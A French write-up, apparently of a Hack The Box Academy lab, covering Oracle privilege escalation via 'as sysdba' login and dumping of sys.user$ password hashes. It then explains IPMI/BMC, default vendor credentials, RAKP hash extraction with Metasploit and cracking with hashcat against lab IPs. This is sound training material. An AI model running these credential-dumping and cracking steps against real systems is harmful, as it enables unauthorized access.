Parfait nous sommes dans le système regardons ce que nous avons comme tables disponibles:

```bash
SQL> select table_name from all_tables;

TABLE_NAME
------------------------------
DUAL
SYSTEM_PRIVILEGE_MAP
TABLE_PRIVILEGE_MAP
STMT_AUDIT_OPTION_MAP
AUDIT_ACTIONS
WRR$_REPLAY_CALL_FILTER
HS_BULKLOAD_VIEW_OBJ
HS$_PARALLEL_METADATA
HS_PARTITION_COL_NAME
HS_PARTITION_COL_TYPE
HELP

TABLE_NAME
------------------------------
DR$OBJECT_ATTRIBUTE
DR$POLICY_TAB
DR$THS
DR$THS_PHRASE
DR$NUMBER_SEQUENCE
SRSNAMESPACE_TABLE
OGIS_SPATIAL_REFERENCE_SYSTEMS
OGIS_GEOMETRY_COLUMNS
SDO_UNITS_OF_MEASURE
SDO_PRIME_MERIDIANS
SDO_ELLIPSOIDS

TABLE_NAME
------------------------------
SDO_DATUMS
SDO_COORD_SYS
SDO_COORD_AXIS_NAMES
SDO_COORD_AXES
SDO_COORD_REF_SYS
SDO_COORD_OP_METHODS
SDO_COORD_OPS
SDO_PREFERRED_OPS_SYSTEM
SDO_PREFERRED_OPS_USER
SDO_COORD_OP_PATHS
SDO_COORD_OP_PARAMS

TABLE_NAME
------------------------------
SDO_COORD_OP_PARAM_USE
SDO_COORD_OP_PARAM_VALS
SDO_CS_SRS
NTV2_XML_DATA
SDO_CRS_GEOGRAPHIC_PLUS_HEIGHT
SDO_PROJECTIONS_OLD_SNAPSHOT
SDO_ELLIPSOIDS_OLD_SNAPSHOT
SDO_DATUMS_OLD_SNAPSHOT
SDO_XML_SCHEMAS
WWV_FLOW_DUAL100
DEPT

TABLE_NAME
------------------------------
EMP
BONUS
SALGRADE
WWV_FLOW_TEMP_TABLE
WWV_FLOW_LOV_TEMP
SDO_TOPO_DATA$
SDO_TOPO_RELATION_DATA
SDO_TOPO_TRANSACT_DATA
SDO_CS_CONTEXT_INFORMATION
SDO_TXN_IDX_EXP_UPD_RGN
SDO_TXN_IDX_DELETES

TABLE_NAME
------------------------------
SDO_TXN_IDX_INSERTS
SDO_ST_TOLERANCE
XDB$XIDX_IMP_T
KU$_DATAPUMP_MASTER_10_1
KU$_DATAPUMP_MASTER_11_1
KU$_DATAPUMP_MASTER_11_1_0_7
KU$_DATAPUMP_MASTER_11_2
IMPDP_STATS
ODCI_PMO_ROWIDS$
ODCI_WARNINGS$
ODCI_SECOBJ$

TABLE_NAME
------------------------------
KU$_LIST_FILTER_TEMP_2
KU$_LIST_FILTER_TEMP
KU$NOEXP_TAB
OL$NODES
OL$HINTS
OL$
PLAN_TABLE$
WRI$_ADV_ASA_RECO_DATA
PSTUBTBL

75 rows selected.
```

Maintenant nous allons voir tout ce qui a **des privilèges**

```bash
SQL> select * from user_role_privs;

USERNAME		       GRANTED_ROLE		      ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT			       CONNECT			      NO  YES NO
SCOTT			       RESOURCE 		      NO  YES NO
```

Bon mon utilisateur n'a pas de permissions nous allons devoir trouver un moyen de monter en privilèges

```bash
/opt/oracle/instantclient_21_4/sqlplus scott/tiger@10.129.223.63/XE as sysdba
```

Maintenant je suis passé admin

```bash
SQL> select * from user_role_privs;

USERNAME		       GRANTED_ROLE		      ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS			       ADM_PARALLEL_EXECUTE_TASK      YES YES NO
SYS			       APEX_ADMINISTRATOR_ROLE	      YES YES NO
SYS			       AQ_ADMINISTRATOR_ROLE	      YES YES NO
SYS			       AQ_USER_ROLE		      YES YES NO
SYS			       AUTHENTICATEDUSER	      YES YES NO
SYS			       CONNECT			      YES YES NO
SYS			       CTXAPP			      YES YES NO
SYS			       DATAPUMP_EXP_FULL_DATABASE     YES YES NO
SYS			       DATAPUMP_IMP_FULL_DATABASE     YES YES NO
SYS			       DBA			      YES YES NO
SYS			       DBFS_ROLE		      YES YES NO

USERNAME		       GRANTED_ROLE		      ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS			       DELETE_CATALOG_ROLE	      YES YES NO
SYS			       EXECUTE_CATALOG_ROLE	      YES YES NO
SYS			       EXP_FULL_DATABASE	      YES YES NO
SYS			       GATHER_SYSTEM_STATISTICS       YES YES NO
SYS			       HS_ADMIN_EXECUTE_ROLE	      YES YES NO
SYS			       HS_ADMIN_ROLE		      YES YES NO
SYS			       HS_ADMIN_SELECT_ROLE	      YES YES NO
SYS			       IMP_FULL_DATABASE	      YES YES NO
SYS			       LOGSTDBY_ADMINISTRATOR	      YES YES NO
SYS			       OEM_ADVISOR		      YES YES NO
SYS			       OEM_MONITOR		      YES YES NO

USERNAME		       GRANTED_ROLE		      ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS			       PLUSTRACE		      YES YES NO
SYS			       RECOVERY_CATALOG_OWNER	      YES YES NO
SYS			       RESOURCE 		      YES YES NO
SYS			       SCHEDULER_ADMIN		      YES YES NO
SYS			       SELECT_CATALOG_ROLE	      YES YES NO
SYS			       XDBADMIN 		      YES YES NO
SYS			       XDB_SET_INVOKER		      YES YES NO
SYS			       XDB_WEBSERVICES		      YES YES NO
SYS			       XDB_WEBSERVICES_OVER_HTTP      YES YES NO
SYS			       XDB_WEBSERVICES_WITH_PUBLIC    YES YES NO

32 rows selected.
```

Comme on peut le voir il y a beaucoup plus de choses qui apparaissent ici mais nous on cherche le hash de l'utilisateur de la question

```bash
SQL> select name, password from sys.user$;

NAME			       PASSWORD
------------------------------ ------------------------------
SYS			       FBA343E7D6C8BC9D
PUBLIC
CONNECT
RESOURCE
DBA
SYSTEM			       B5073FE1DE351687
SELECT_CATALOG_ROLE
EXECUTE_CATALOG_ROLE
DELETE_CATALOG_ROLE
OUTLN			       4A3BA55E08595C81
EXP_FULL_DATABASE

NAME			       PASSWORD
------------------------------ ------------------------------
IMP_FULL_DATABASE
LOGSTDBY_ADMINISTRATOR
DBFS_ROLE
DIP			       CE4A36B8E06CA59C
AQ_ADMINISTRATOR_ROLE
AQ_USER_ROLE
DATAPUMP_EXP_FULL_DATABASE
DATAPUMP_IMP_FULL_DATABASE
ADM_PARALLEL_EXECUTE_TASK
GATHER_SYSTEM_STATISTICS
XDB_WEBSERVICES_OVER_HTTP

NAME			       PASSWORD
------------------------------ ------------------------------
ORACLE_OCM		       5A2E026A9157958C
RECOVERY_CATALOG_OWNER
SCHEDULER_ADMIN
HS_ADMIN_SELECT_ROLE
HS_ADMIN_EXECUTE_ROLE
HS_ADMIN_ROLE
OEM_ADVISOR
OEM_MONITOR
DBSNMP			       E066D214D5421CCC
APPQOSSYS		       519D632B7EE7F63A
PLUSTRACE

NAME			       PASSWORD
------------------------------ ------------------------------
CTXSYS			       D1D21CA56994CAB6
CTXAPP
XDB			       E76A6BD999EF9FF1
ANONYMOUS		       anonymous
XDBADMIN
XDB_SET_INVOKER
AUTHENTICATEDUSER
XDB_WEBSERVICES
XDB_WEBSERVICES_WITH_PUBLIC
XS$NULL 		       DC4FCC8CB69A6733
_NEXT_USER

NAME			       PASSWORD
------------------------------ ------------------------------
MDSYS			       72979A94BAD2AF80
HR			       4C6D73C3E8B0F0DA
FLOWS_FILES		       30128982EA6D4A3D
APEX_PUBLIC_USER	       4432BA224E12410A
APEX_ADMINISTRATOR_ROLE
APEX_040000		       E7CE9863D7EEB0A4
SCOTT			       F894844C34402B67

51 rows selected.
```

> Le `$` après user sert a dire tout ce qui commence par user et peut importe ce qu'il y a après.
{: .prompt-tip}

Nous voyons donc le fameux hash de `DBSNMP`

**Réponse :** `E066D214D5421CCC`

---

## IPMI (Intelligent Platform Management Interface)

### Qu'est-ce qu'IPMI ?

**Intelligent Platform Management Interface (IPMI)** est un ensemble de spécifications standardisées pour les systèmes de gestion d'hôtes basés sur le matériel, utilisés pour la gestion et la surveillance des systèmes. Il fonctionne comme un sous-système autonome et indépendamment du BIOS, du CPU, du firmware et du système d'exploitation de l'hôte.

> **Pour les débutants** : IPMI permet aux administrateurs système de gérer et surveiller des serveurs même quand ils sont éteints ou ne répondent plus. C'est comme avoir une "porte dérobée" matérielle dans le serveur qui fonctionne toujours, même si l'ordinateur est arrêté.
{: .prompt-info}

**Caractéristiques principales :**
- Fonctionne via une connexion réseau directe au matériel
- Ne nécessite pas d'accès au système d'exploitation
- Permet les mises à jour à distance sans accès physique
- Fonctionne indépendamment de l'état du système

### Cas d'usage d'IPMI

IPMI est typiquement utilisé dans **trois situations critiques** :

| Situation | Usage |
|-----------|-------|
| **Avant le boot de l'OS** | Modifier les paramètres BIOS |
| **Système complètement éteint** | Gérer un serveur sans alimentation |
| **Après une panne système** | Accéder à un hôte en échec |

**Capacités de surveillance :**

Lorsqu'il n'est pas utilisé pour ces tâches critiques, IPMI peut surveiller :
- Température du système
- Voltage
- État des ventilateurs
- Alimentations
- Informations d'inventaire
- Logs matériels
- Alertes via SNMP

> **Important** : Le système hôte peut être éteint, mais le module IPMI nécessite une **source d'alimentation** et une **connexion LAN** pour fonctionner correctement.
{: .prompt-warning}

### Histoire et adoption

**IPMI** a été publié pour la première fois par Intel en 1998. Aujourd'hui, il est supporté par plus de **200 fabricants de systèmes**, incluant :
- Cisco
- Dell
- HP
- Supermicro
- Intel
- Et bien d'autres

**IPMI version 2.0** permet l'administration via **serial over LAN**, donnant aux administrateurs la capacité de visualiser la sortie de la console série en bande.

### Composants requis pour IPMI

Pour fonctionner, IPMI nécessite plusieurs composants :

| Composant | Description |
|-----------|-------------|
| **BMC** (Baseboard Management Controller) | Micro-contrôleur essentiel d'IPMI |
| **ICMB** (Intelligent Chassis Management Bus) | Interface permettant la communication entre châssis |
| **IPMB** (Intelligent Platform Management Bus) | Étend le BMC |
| **IPMI Memory** | Stocke les logs d'événements système, données de repository |
| **Communications Interfaces** | Interfaces système local, série et LAN, ICMB et PCI Management Bus |

### Baseboard Management Controllers (BMC)

Les systèmes utilisant le protocole IPMI sont appelés **Baseboard Management Controllers (BMCs)**.

**Caractéristiques des BMC :**
- Généralement implémentés comme **systèmes ARM embarqués** exécutant Linux
- Connectés directement à la carte mère de l'hôte
- Intégrés dans de nombreuses cartes mères
- Peuvent être ajoutés comme carte PCI

**BMC courants en pentest :**

| Fabricant | Produit BMC |
|-----------|-------------|
| HP | iLO (Integrated Lights-Out) |
| Dell | DRAC (Dell Remote Access Controller) |
| Supermicro | IPMI |

> **Risque critique** : Obtenir l'accès à un BMC est **presque équivalent à un accès physique** au système. Nous pouvons surveiller, redémarrer, éteindre, ou même réinstaller le système d'exploitation de l'hôte.
{: .prompt-danger}

### Interfaces d'accès BMC

La plupart des BMC exposent plusieurs interfaces :
1. **Console de gestion web** (interface graphique)
2. **Protocole d'accès distant** (Telnet ou SSH)
3. **Port 623 UDP** (protocole réseau IPMI)

### Énumération avec Nmap

IPMI communique sur le **port 623 UDP**. J'ai utilisé le script NSE `ipmi-version` pour identifier le service :
```bash
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
```

**Résultat :**
```
PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth:
|   PassAuth: auth_user, non_null_user
|_  Level: 2.0
MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)
```

**Mon analyse :**
- Le protocole IPMI écoute bien sur le port 623
- Version détectée : **IPMI 2.0**
- Fabricant : **Hewlett Packard Enterprise** (HP iLO)
- Méthodes d'authentification supportées : `auth_user`, `non_null_user`

### Énumération avec Metasploit

Metasploit propose un scanner dédié pour identifier les versions IPMI :
```bash
msf6 > use auxiliary/scanner/ipmi/ipmi_version
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > run
```

**Résultat :**
```
[*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts)
[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0)
[*] Scanned 1 of 1 hosts (100% complete)
```

**Mon observation :** Le scanner confirme IPMI 2.0 avec support de plusieurs méthodes d'authentification (password, md5, md2, null).

### Mots de passe par défaut

Lors de pentests internes, nous trouvons fréquemment des BMC où les administrateurs n'ont **pas changé le mot de passe par défaut**.

**Credentials par défaut courants :**

| Produit | Nom d'utilisateur | Mot de passe |
|---------|-------------------|--------------|
| **Dell iDRAC** | `root` | `calvin` |
| **HP iLO** | `Administrator` | Chaîne aléatoire de 8 caractères (chiffres + majuscules) |
| **Supermicro IPMI** | `ADMIN` | `ADMIN` |

> **Astuce pentest** : Toujours tester les mots de passe par défaut pour TOUS les services découverts. Ils sont souvent laissés inchangés et peuvent mener à des victoires rapides.
{: .prompt-tip}

Ces credentials par défaut peuvent nous donner accès à :
- La console web de gestion
- L'accès ligne de commande via SSH ou Telnet

### Vulnérabilité du protocole RAKP (IPMI 2.0)

Si les credentials par défaut ne fonctionnent pas, nous pouvons exploiter une **faille dans le protocole RAKP** d'IPMI 2.0.

**Comment fonctionne l'exploit :**

Pendant le processus d'authentification, le serveur envoie un **hash salé SHA1 ou MD5** du mot de passe utilisateur au client **avant que l'authentification n'ait lieu**. Cette faille permet d'obtenir le hash du mot de passe pour **N'IMPORTE QUEL compte utilisateur valide** sur le BMC.

**Ce qui m'inquiète :** 
- Cette vulnérabilité est une **composante critique de la spécification IPMI**
- Il n'existe **pas de correctif direct** car c'est inhérent au protocole
- Les hashes peuvent être crackés offline avec Hashcat (mode 7300)

**Mitigations possibles :**
1. Utiliser des mots de passe très longs et difficiles à cracker
2. Implémenter des règles de segmentation réseau pour restreindre l'accès direct aux BMC

### Cracking de hash HP iLO

Pour un HP iLO utilisant un mot de passe par défaut d'usine (8 caractères : majuscules + chiffres), j'utilise cette commande Hashcat avec attaque par masque :
```bash
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

**Explication :**
- `-m 7300` : Mode IPMI 2.0 RAKP HMAC-SHA1
- `-a 3` : Attaque par masque
- `?1?1?1?1?1?1?1?1` : 8 caractères du jeu personnalisé
- `-1 ?d?u` : Jeu personnalisé = chiffres (`?d`) + majuscules (`?u`)

> Cette attaque teste toutes les combinaisons de lettres majuscules et chiffres pour un mot de passe de 8 caractères.
{: .prompt-info}

### Extraction de hashes avec Metasploit

J'ai utilisé le module Metasploit pour récupérer les hashes IPMI :
```bash
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options
```

**Options du module :**

| Option | Valeur par défaut | Description |
|--------|-------------------|-------------|
| `CRACK_COMMON` | true | Cracker automatiquement les mots de passe courants |
| `OUTPUT_HASHCAT_FILE` | - | Sauvegarder les hashes au format Hashcat |
| `OUTPUT_JOHN_FILE` | - | Sauvegarder les hashes au format John the Ripper |
| `PASS_FILE` | `/usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt` | Fichier de mots de passe courants |
| `USER_FILE` | `/usr/share/metasploit-framework/data/wordlists/ipmi_users.txt` | Fichier de noms d'utilisateur |

**Lancement de l'extraction :**
```bash
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
```

**Résultat :**
```
[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
[*] Scanned 1 of 1 hosts (100% complete)
```

**Mon analyse :**
- Hash récupéré avec succès pour l'utilisateur **ADMIN**
- L'outil a automatiquement cracké le hash
- Mot de passe trouvé : **ADMIN** (mot de passe par défaut)

> **Astuce** : Expérimenter avec différentes wordlists est crucial pour obtenir le mot de passe à partir du hash acquis.
{: .prompt-tip}

### Exploitation post-compromission

Une fois le mot de passe obtenu, plusieurs options s'offrent à nous :

1. **Se connecter au BMC** pour un accès complet au matériel
2. **Tester la réutilisation du mot de passe** sur d'autres systèmes

**Cas réel que j'ai rencontré :**

Lors d'un pentest, nous avons :
1. Obtenu un hash IPMI
2. Cracké le hash offline avec Hashcat
3. Découvert que le mot de passe était **réutilisé**
4. Réussi à SSH sur de nombreux serveurs critiques en tant que **root**
5. Obtenu l'accès aux consoles de gestion web de divers outils de monitoring réseau

> **Risque majeur** : IPMI est très courant dans les environnements réseau. La facilité d'administration s'accompagne du risque d'exposer les hashes de mots de passe à quiconque sur le réseau, pouvant mener à un accès non autorisé, une perturbation du système, et même l'exécution de code à distance.
{: .prompt-danger}

### Points importants à retenir

Lors de l'énumération IPMI, je me concentre systématiquement sur :

1. **Scanner le port 623 UDP** pour identifier IPMI
2. **Identifier la version** IPMI (2.0 est vulnérable au RAKP)
3. **Tester les credentials par défaut** spécifiques au fabricant
4. **Extraire les hashes** avec Metasploit si les défauts échouent
5. **Cracker les hashes offline** avec Hashcat mode 7300
6. **Tester la réutilisation des mots de passe** trouvés sur d'autres systèmes
7. **Documenter l'accès BMC** comme découverte à haut risque

> **Rappel critique** : Vérifier IPMI doit faire partie de notre playbook de pentest interne pour TOUT environnement que nous évaluons. L'accès à un BMC est presque équivalent à un accès physique au serveur.
{: .prompt-warning}

### Pourquoi IPMI est si critique

**Du point de vue de l'administrateur :**
- Nécessaire pour accéder aux serveurs à distance en cas de panne
- Permet d'effectuer des tâches de maintenance qui nécessitaient traditionnellement une présence physique

**Du point de vue de l'attaquant :**
- Accès complet au matériel même si l'OS est éteint
- Possibilité de réinstaller l'OS, redémarrer, surveiller
- Hashes exposés à quiconque sur le réseau
- Souvent mots de passe par défaut ou réutilisés

Pour approfondir IPMI et sa sécurisation, consulter :
- [IPMI Specification v2.0](https://www.intel.com/content/www/us/en/products/docs/servers/ipmi/ipmi-second-gen-interface-spec-v2-rev1-1.html)
- [Metasploit IPMI Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/scanner/ipmi)
- [Hashcat IPMI Mode 7300](https://hashcat.net/wiki/doku.php?id=example_hashes)

---

**What username is configured for accessing the host via IPMI?**

Nous allons tester des noms de base du système en premier pour voir et en effet `admin` fonctionne bien

**Réponse :** `admin`

**What is the account's cleartext password?**

Pour trouver le mot de passe nous allons utiliser **metasploit**

```bash
use scanner/ipmi/ipmi_dumphashes
```

```bash
[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_dumphashes) >> set rhosts 10.129.44.89
rhosts => 10.129.44.89
[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_dumphashes) >> run
[+] 10.129.44.89:623 - IPMI - Hash found: admin:6c3152d982000000bf77e77a9449f746addd144ddf293407b2d7143fe8a7e67cd8268d377eb8dc0aa123456789abcdefa123456789abcdef140561646d696e:b4ca14a97972d9db12b2119ae03390a53d5018d9
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Je set le `rhosts` a l'IP machine et je run le tout et nous pouvons voir le hash de `admin` que nous allons décrypter voici comment j'ai procédé:

```bash
┌─[eu-academy-3]─[10.10.15.135]─[htb-ac-1999270@htb-ag13cypqym]─[~]
└──╼ [★]$ echo "6c3152d982000000bf77e77a9449f746addd144ddf293407b2d7143fe8a7e67cd8268d377eb8dc0aa123456789abcdefa123456789abcdef140561646d696e:b4ca14a97972d9db12b2119ae03390a53d5018d9" > ipmi_hash.txt
┌─[eu-academy-3]─[10.10.15.135]─[htb-ac-1999270@htb-ag13cypqym]─[~]
└──╼ [★]$ ls
cacert.der  Desktop  Documents  Downloads  ipmi_hash.txt  Music  Pictures  Public  Templates  Videos
┌─[eu-academy-3]─[10.10.15.135]─[htb-ac-1999270@htb-ag13cypqym]─[~]
└──╼ [★]$ hashcat -m 7300 ipmi_hash.txt /usr/share/wordlists/rockyou.txt.gz 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-AMD EPYC 7543 32-Core Processor, skipped

OpenCL API (OpenCL 2.1 LINUX) - Platform #2 [Intel(R) Corporation]
==================================================================
* Device #2: AMD EPYC 7543 32-Core Processor, 3923/7910 MB (988 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt.gz
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

6c3152d982000000bf77e77a9449f746addd144ddf293407b2d7143fe8a7e67cd8268d377eb8dc0aa123456789abcdefa123456789abcdef140561646d696e:b4ca14a97972d9db12b2119ae03390a53d5018d9:trinity
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 7300 (IPMI2 RAKP HMAC-SHA1)
Hash.Target......: 6c3152d982000000bf77e77a9449f746addd144ddf293407b2d...5018d9
Time.Started.....: Wed Nov 26 12:35:26 2025 (0 secs)
Time.Estimated...: Wed Nov 26 12:35:26 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:  1617.3 kH/s (0.52ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2048/14344385 (0.01%)
Rejected.........: 0/2048 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#2....: 123456 -> lovers1

Started: Wed Nov 26 12:35:19 2025
Stopped: Wed Nov 26 12:35:27 2025
```

Dans un premier temps j'ai mis le hash dans un fichier texte puis j'ai fais un `hashcat` dessu ce qui nous donne le mot de passe tout au bout du hashage

```bash
6c3152d982000000bf77e77a9449f746addd144ddf293407b2d7143fe8a7e67cd8268d377eb8dc0aa123456789abcdefa123456789abcdef140561646d696e:b4ca14a97972d9db12b2119ae03390a53d5018d9:trinity
```

**Réponse :** `trinity`

**Cours complété**

{% include comments.html %}